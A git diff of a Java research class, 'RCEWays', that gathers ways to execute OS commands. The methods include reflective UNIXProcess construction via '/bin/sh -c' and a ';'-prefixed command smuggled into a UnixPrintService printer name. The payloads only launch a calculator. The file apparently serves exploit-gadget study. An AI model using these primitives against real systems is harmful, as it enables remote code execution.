@@ -10,6 +10,9 @@ import xyz.eki.marshalexp.utils.ReflectUtils;
 
 import java.beans.Expression;
 import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Method;
 import java.lang.reflect.Type;
@@ -17,7 +20,29 @@ import java.util.Arrays;
 import java.util.Map;
 
 public class RCEWays {
-    public static String cmd = "Open -a Calculator.app";
+    public static String inputStreamToString(InputStream in, String charset) throws IOException {
+        try {
+            if (charset == null) {
+                charset = "UTF-8";
+            }
+            ByteArrayOutputStream out = new ByteArrayOutputStream();
+            int                   a   = 0;
+            byte[]                b   = new byte[1024];
+
+            while ((a = in.read(b)) != -1) {
+                out.write(b, 0, a);
+            }
+
+            return new String(out.toByteArray());
+        } catch (IOException e) {
+            throw e;
+        } finally {
+            if (in != null)
+                in.close();
+        }
+    }
+
+    public static String cmd = "mate-calc";
     public static void case1() throws Exception{
         Runtime.getRuntime().exec(cmd);
     }
@@ -50,8 +75,7 @@ public class RCEWays {
          *                 final int[] fds,
          *                 final boolean redirectErrorStream)
          */
-        Class<?> UnixProcess = Class.forName("java.lang.UNIXProcess");
-//        Constructor<?> constructor = UnixProcess.getConstructor(byte[].class,
+        //        Constructor<?> constructor = UnixProcess.getConstructor(byte[].class,
 //                byte[].class,int.class,
 //                byte[].class,int.class,
 //                byte[].class,
@@ -59,21 +83,31 @@ public class RCEWays {
 //                boolean.class
 //        );
 //        Constructor<?> constructor = ReflectUtils.getFirstCtor(UnixProcess);
+        String cmd = "mate-calc";
+        Class<?> UnixProcess = Class.forName("java.lang.UNIXProcess");
         Constructor<?> constructor = UnixProcess.getDeclaredConstructors()[0];
         constructor.setAccessible(true);
 
         byte[] argBlock = String.format("-c\00%s",cmd).getBytes();
-        constructor.newInstance("/bin/bash".getBytes(),
-                argBlock,argBlock.length,
-                null,0,
+        Object o = constructor.newInstance("/bin/sh".getBytes(),
+                argBlock, argBlock.length,
+                null, 0,
                 null,
-                new int[]{-1,-1,-1},
+                new int[]{-1, -1, -1},
                 false
         );
+        Method getInputStream = o.getClass().getDeclaredMethod("getInputStream");
+        getInputStream.setAccessible(true);
+        InputStream invoke = (InputStream) getInputStream.invoke(o);
+        System.out.println(inputStreamToString(invoke,"UTF-8"));
     }
 
     public static void case5() throws Exception{
-        UnixPrintService exp = GUnixPrintService.getter2RCE(cmd);
+//        UnixPrintService exp = GUnixPrintService.getter2RCE(cmd);
+        Constructor<?> constructor = ReflectUtils.getFirstCtor(UnixPrintService.class);
+        constructor.setAccessible(true);
+        UnixPrintService exp = (UnixPrintService) constructor.newInstance(";"+cmd);
+
         Method getPrinterIsAcceptingJobsAIXMethod = UnixPrintService.class.getDeclaredMethod("getPrinterIsAcceptingJobsAIX",null);
         getPrinterIsAcceptingJobsAIXMethod.setAccessible(true);
         getPrinterIsAcceptingJobsAIXMethod.invoke(exp,null);
@@ -87,25 +121,23 @@ public class RCEWays {
 
     //Unix (Not Mac) Only
     public static void case7() throws Exception{
-        cmd = "touch /tmp/flag";
+//        cmd = "touch /tmp/flag";
         UnixPrintServiceLookup exp = GUnixPrintService.getDefaultPrintService2RCE(cmd);
-        Method getPrinterIsAcceptingJobsAIXMethod = UnixPrintServiceLookup.class.getDeclaredMethod("getDefaultPrintService");
-        getPrinterIsAcceptingJobsAIXMethod.invoke(exp,null);
+        Method getDefaultPrintService = UnixPrintServiceLookup.class.getDeclaredMethod("getDefaultPrintService");
+        getDefaultPrintService.invoke(exp,null);
 
-        //System.out.println("wtf");
+//        System.out.println("wtf");
 
-        System.out.println(MiscUtils.executeCommand("ls /tmp"));
-
-
+//        System.out.println(MiscUtils.executeCommand("ls /tmp"));
     }
 
     public static void case8() throws Exception{
         Runtime runtime = Runtime.getRuntime();
-        Expression expression = new Expression(runtime, "exec", new Object[]{"open -a Calculator"});
+        Expression expression = new Expression(runtime, "exec", new Object[]{cmd});
         expression.getValue();
     }
 
     public static void main(String[] args) throws Exception{
-        case8();
+        case7();
     }
 }
